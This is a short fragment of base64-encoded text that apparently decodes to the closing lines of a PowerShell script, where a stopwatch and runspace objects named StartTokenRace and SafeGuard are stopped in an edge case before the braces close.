sIHJ1bnNwYWNlICYgc3RvcHdhdGNoIGlmIGVkZ2UtY2FzZQoJCSRTdGFydFRva2VuUmFjZS5TdG9wKCkKCQkkU2FmZUd1YXJkLlN0b3AoKQoJfQp9
